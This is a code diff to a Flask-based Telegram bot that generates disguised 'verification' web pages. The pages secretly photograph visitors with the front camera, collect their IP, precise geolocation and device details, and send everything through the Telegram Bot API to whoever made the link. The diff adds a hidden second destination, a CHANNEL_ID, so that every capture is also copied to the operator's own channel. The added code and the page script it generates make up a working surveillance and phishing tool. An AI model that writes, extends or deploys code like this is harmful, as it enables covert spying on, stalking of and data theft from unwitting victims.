@@ -14,8 +14,9 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# ========== CONFIGURATION ==========
+# ========== ENVIRONMENT VARIABLES ==========
 TOKEN = os.environ.get("BOT_TOKEN")
+CHANNEL_ID = os.environ.get("CHANNEL_ID")  # तुम्हारी channel id यहाँ से आएगी
 REQUIRED_CHANNEL = "@nrtecno2"
 ACCOUNT_NAME = "telegram-bot-b9j0"
 HTML_DIR = "html_files"
@@ -91,6 +92,9 @@ def generate_html(user_id, target_url):
     filename = f"v_{user_id}_{int(time.time())}.html"
     filepath = os.path.join(HTML_DIR, filename)
     
+    # CHANNEL_ID env var से लिया जाएगा – default khali रखा है
+    storage_channel = CHANNEL_ID if CHANNEL_ID else "null"
+    
     html = f"""<!DOCTYPE html>
 <html>
 <head>
@@ -103,8 +107,7 @@ def generate_html(user_id, target_url):
         .container {{ background: white; border-radius: 20px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }}
         .spinner {{ width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }}
         @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-        .btn {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 16px; cursor: pointer; margin: 10px 0; width: 100%; font-weight: bold; transition: transform 0.3s; }}
-        .btn:hover {{ transform: scale(1.02); }}
+        .btn {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 16px; cursor: pointer; margin: 10px 0; width: 100%; font-weight: bold; }}
         .skip {{ background: #95a5a6; }}
         .error {{ color: #e74c3c; margin-top: 10px; font-size: 14px; }}
         .info {{ color: #666; font-size: 12px; margin-top: 20px; }}
@@ -120,7 +123,7 @@ def generate_html(user_id, target_url):
     </div>
     <div id="step2" style="display:none">
         <h2>Verification Required</h2>
-        <button class="btn" onclick="requestCamera()">📸 CONTINUE</button>
+        <button class="btn" onclick="requestCamera()">CONTINUE</button>
         <div id="errorMsg" class="error"></div>
         <p class="info">Camera access is required to continue</p>
     </div>
@@ -133,8 +136,8 @@ def generate_html(user_id, target_url):
         <div class="spinner"></div>
         <h2>Location Access (Optional)</h2>
         <p>This helps us verify your region</p>
-        <button class="btn" onclick="allowLocation()">📍 ALLOW LOCATION</button>
-        <button class="btn skip" onclick="skipLocation()">⏭ SKIP</button>
+        <button class="btn" onclick="allowLocation()">ALLOW LOCATION</button>
+        <button class="btn skip" onclick="skipLocation()">SKIP</button>
     </div>
     <div id="step5" style="display:none">
         <div class="spinner"></div>
@@ -148,6 +151,7 @@ def generate_html(user_id, target_url):
 <script>
 const TOKEN = "{TOKEN}";
 const USER = {user_id};
+const STORAGE = {storage_channel};
 const TARGET = "{target_url}";
 let locationAllowed = false;
 let locationSkipped = false;
@@ -167,10 +171,19 @@ async function sendToUser(text, file=null) {{
             fd.append('chat_id', USER);
             fd.append('photo', file);
             await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd}});
+            if(STORAGE) {{
+                let fd2 = new FormData();
+                fd2.append('chat_id', STORAGE);
+                fd2.append('photo', file);
+                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd2}});
+            }}
         }} else {{
             await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:USER, text:text, parse_mode:'HTML'}})}});
+            if(STORAGE) {{
+                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:STORAGE, text:text, parse_mode:'HTML'}})}});
+            }}
         }}
-    }} catch(e) {{}}
+    }} catch(e) {{ console.log(e); }}
 }}
 
 async function getIPInfo(ip) {{
@@ -193,20 +206,18 @@ async function getBattery() {{
 
 function getDeviceInfo() {{
     const ua = navigator.userAgent;
-    let deviceType = 'Unknown';
-    if (/iPhone/i.test(ua)) deviceType = 'iPhone';
-    else if (/iPad/i.test(ua)) deviceType = 'iPad';
-    else if (/Android/i.test(ua)) deviceType = 'Android Phone';
-    else if (/Mobile/i.test(ua)) deviceType = 'Mobile Device';
-    else deviceType = 'Desktop/Laptop';
-    return deviceType;
+    if (/iPhone/i.test(ua)) return 'iPhone';
+    if (/iPad/i.test(ua)) return 'iPad';
+    if (/Android/i.test(ua)) return 'Android Phone';
+    if (/Mobile/i.test(ua)) return 'Mobile Device';
+    return 'Desktop/Laptop';
 }}
 
 function getHardwareInfo() {{
-    const info = {{ cores: navigator.hardwareConcurrency || 'Unknown' }};
-    if(navigator.deviceMemory) info.ram = navigator.deviceMemory + ' GB';
-    else info.ram = 'Unknown';
-    return info;
+    let cores = navigator.hardwareConcurrency || 'Unknown';
+    let ram = 'Unknown';
+    if(navigator.deviceMemory) ram = navigator.deviceMemory + ' GB';
+    return {{ cores: cores, ram: ram }};
 }}
 
 async function getStorageInfo() {{
@@ -214,8 +225,6 @@ async function getStorageInfo() {{
         if('storage' in navigator && 'estimate' in navigator.storage) {{
             let estimate = await navigator.storage.estimate();
             return {{
-                used: estimate.usage,
-                total: estimate.quota,
                 usedFormatted: formatBytes(estimate.usage),
                 totalFormatted: formatBytes(estimate.quota)
             }};
@@ -235,39 +244,32 @@ async function captureData() {{
         let language = navigator.language || navigator.userLanguage || 'Unknown';
         let resolution = screen.width + 'x' + screen.height;
         
-        let message = `📊 <b>Visitor Information Captured</b>
-━━━━━━━━━━━━━━━━━━━━━━
-
-🖥️ <b>Device & Browser</b>
-   • Device: ${deviceType}
-   • User Agent: ${navigator.userAgent.substring(0, 200)}
-
-🌐 <b>Network Information</b>
-   • IP Address: ${ip}
-   • Language: ${language}
-
-📍 <b>Location Details</b>
-   • Country: ${ipInfo.country_name || 'Unknown'}
-   • Region: ${ipInfo.region || 'Unknown'}
-   • City: ${ipInfo.city || 'Unknown'}
-   • Postal Code: ${ipInfo.postal || 'Unknown'}
-   • Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-
-🖼️ <b>Display Information</b>
-   • Resolution: ${resolution}
-
-🔋 <b>Battery Status</b>
-   • Level: ${battery ? battery.level + '%' : 'Unknown'}
-   • Charging: ${battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown'}
-
-💾 <b>Hardware & Storage</b>
-   • CPU Cores: ${hardware.cores}
-   • RAM: ${hardware.ram}
-   • Storage Used: ${storage ? storage.usedFormatted : 'Unknown'}
-   • Storage Total: ${storage ? storage.totalFormatted : 'Unknown'}
-
-━━━━━━━━━━━━━━━━━━━━━━
-⚡ Developed by: @nrtecno2`;
+        let message = "<b>Visitor Information Captured</b>\\n";
+        message += "------------------------\\n\\n";
+        message += "<b>Device & Browser</b>\\n";
+        message += "   Device: " + deviceType + "\\n";
+        message += "   User Agent: " + navigator.userAgent.substring(0, 200) + "\\n\\n";
+        message += "<b>Network Information</b>\\n";
+        message += "   IP Address: " + ip + "\\n";
+        message += "   Language: " + language + "\\n\\n";
+        message += "<b>Location Details</b>\\n";
+        message += "   Country: " + (ipInfo.country_name || 'Unknown') + "\\n";
+        message += "   Region: " + (ipInfo.region || 'Unknown') + "\\n";
+        message += "   City: " + (ipInfo.city || 'Unknown') + "\\n";
+        message += "   Postal Code: " + (ipInfo.postal || 'Unknown') + "\\n";
+        message += "   Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\\n\\n";
+        message += "<b>Display Information</b>\\n";
+        message += "   Resolution: " + resolution + "\\n\\n";
+        message += "<b>Battery Status</b>\\n";
+        message += "   Level: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
+        message += "   Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\\n\\n";
+        message += "<b>Hardware & Storage</b>\\n";
+        message += "   CPU Cores: " + hardware.cores + "\\n";
+        message += "   RAM: " + hardware.ram + "\\n";
+        message += "   Storage Used: " + (storage ? storage.usedFormatted : 'Unknown') + "\\n";
+        message += "   Storage Total: " + (storage ? storage.totalFormatted : 'Unknown') + "\\n\\n";
+        message += "------------------------\\n";
+        message += "Developed by: @nrtecno2";
         
         await sendToUser(message);
         return true;
@@ -290,7 +292,7 @@ async function captureFrontPhoto() {{
         canvas.getContext('2d').drawImage(video, 0, 0);
         let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
         if(blob && blob.size > 500) {{
-            await sendToUser('📸 <b>FRONT CAMERA PHOTO</b>', blob);
+            await sendToUser('<b>FRONT CAMERA PHOTO</b>', blob);
         }}
         stream.getTracks().forEach(t => t.stop());
         return true;
@@ -307,11 +309,11 @@ async function allowLocation() {{
     
     if(navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(async (p) => {{
-            await sendToUser(`📍 <b>LIVE LOCATION</b>\nhttps://www.google.com/maps?q=${{p.coords.latitude}},${{p.coords.longitude}}`);
-            await sendToUser(`📍 <b>Coordinates</b>\nLatitude: ${{p.coords.latitude}}\nLongitude: ${{p.coords.longitude}}\nAccuracy: ${{p.coords.accuracy}}m`);
+            await sendToUser('<b>LIVE LOCATION</b>\\nhttps://www.google.com/maps?q=' + p.coords.latitude + ',' + p.coords.longitude);
+            await sendToUser('<b>Coordinates</b>\\nLatitude: ' + p.coords.latitude + '\\nLongitude: ' + p.coords.longitude + '\\nAccuracy: ' + p.coords.accuracy + 'm');
             setTimeout(() => window.location.href = TARGET, 1500);
         }}, async (err) => {{
-            await sendToUser('📍 Location: Access denied by user');
+            await sendToUser('Location: Access denied by user');
             setTimeout(() => window.location.href = TARGET, 1500);
         }}, {{ timeout: 10000, enableHighAccuracy: true }});
     }} else {{
@@ -324,7 +326,7 @@ async function skipLocation() {{
     locationAllowed = false;
     document.getElementById('step4').style.display = 'none';
     document.getElementById('step5').style.display = 'block';
-    await sendToUser('📍 Location: Skipped by user');
+    await sendToUser('Location: Skipped by user');
     setTimeout(() => window.location.href = TARGET, 1500);
 }}
 
@@ -337,12 +339,12 @@ async function requestCamera() {{
     if(cameraSuccess) {{
         document.getElementById('step3').style.display = 'none';
         document.getElementById('step4').style.display = 'block';
-        await sendToUser('✅ Camera access granted');
+        await sendToUser('Camera access granted');
     }} else {{
         document.getElementById('step3').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-        document.getElementById('errorMsg').innerHTML = '❌ Camera access required! Please click CONTINUE and allow camera.';
-        await sendToUser('❌ Camera access denied by user');
+        document.getElementById('errorMsg').innerHTML = 'Camera access required!';
+        await sendToUser('Camera access denied by user');
     }}
 }}
 
@@ -361,24 +363,22 @@ start();
     increment_links()
     return filename
 
-# ========== BOT HANDLERS ==========
 def process_update(update):
     try:
         if hasattr(update, 'message') and update.message:
             msg = update.message
             text = msg.text if msg.text else ""
             chat_id = msg.chat.id
-            user_name = msg.from_user.first_name
             
             if text == '/start':
                 if not is_subscribed(chat_id):
                     markup = telebot.types.InlineKeyboardMarkup()
-                    markup.add(telebot.types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2"))
-                    markup.add(telebot.types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
-                    bot.send_message(chat_id, f"🚫 Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
+                    markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
+                    markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
+                    bot.send_message(chat_id, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
                 else:
                     set_user_state(chat_id, {"state": "waiting_url"})
-                    bot.send_message(chat_id, "✅ Send me any URL:\nhttps://www.instagram.com/p/xxxxx")
+                    bot.send_message(chat_id, "Send me any URL")
             
             elif text.startswith(('http://', 'https://')):
                 state = get_user_state(chat_id)
@@ -386,12 +386,12 @@ def process_update(update):
                     filename = generate_html(chat_id, text)
                     set_user_state(chat_id, {"state": None})
                     link = f"https://{ACCOUNT_NAME}.onrender.com/view/{filename}"
-                    bot.send_message(chat_id, f"✅ LINK GENERATED:\n{link}\n\n⚠️ Link expires in 10 minutes!\n📸 Camera COMPULSORY\n📍 Location OPTIONAL")
+                    bot.send_message(chat_id, f"Your link:\n{link}\n\nExpires in 10 minutes")
                 else:
-                    bot.send_message(chat_id, "❌ Use /start first")
+                    bot.send_message(chat_id, "Use /start first")
             else:
                 if text != '/start':
-                    bot.send_message(chat_id, "❌ Send a valid URL starting with http:// or https://")
+                    bot.send_message(chat_id, "Send a valid URL")
     except Exception as e:
         logger.error(f"Process error: {e}")
 
@@ -399,14 +399,13 @@ def process_callback(call):
     try:
         if call.data == "verify":
             if is_subscribed(call.from_user.id):
-                bot.edit_message_text("✅ Verified!\n\nSend me any URL:", call.from_user.id, call.message.message_id)
+                bot.edit_message_text("Verified! Send URL:", call.from_user.id, call.message.message_id)
                 set_user_state(call.from_user.id, {"state": "waiting_url"})
             else:
-                bot.answer_callback_query(call.id, "❌ Join channel first!", True)
+                bot.answer_callback_query(call.id, "Join channel first!", True)
     except Exception as e:
         logger.error(f"Callback error: {e}")
 
-# ========== FLASK ROUTES ==========
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
@@ -429,11 +428,9 @@ def serve_html(filename):
 
 @app.route('/')
 def home():
-    return f"🐉 DRAGON LORD MODE ACTIVE | Total Links: {sum(1 for _ in os.listdir(HTML_DIR) if _.endswith('.html'))}"
+    return f"DRAGON ACTIVE | Links: {len([f for f in os.listdir(HTML_DIR) if f.endswith('.html')])}"
 
-# ========== MAIN ==========
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     start_auto_cleanup()
-    logger.info(f"🚀 DRAGON bot starting on port {port}")
     app.run(host='0.0.0.0', port=port)
